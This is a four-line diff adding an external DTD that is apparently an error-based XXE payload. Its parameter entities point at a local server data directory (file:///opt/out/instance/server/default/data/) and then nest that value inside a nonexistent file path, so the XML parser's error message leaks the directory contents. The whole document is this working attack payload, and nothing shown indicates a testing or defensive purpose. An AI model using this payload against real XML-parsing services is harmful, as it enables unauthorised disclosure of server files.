@@ -1,0 +1,4 @@
+<!ENTITY % a SYSTEM "file:///opt/out/instance/server/default/data/">
+<!ENTITY % b "<!ENTITY &#x25; c SYSTEM 'file:///NX/%a;'>">
+%b;
+%c;
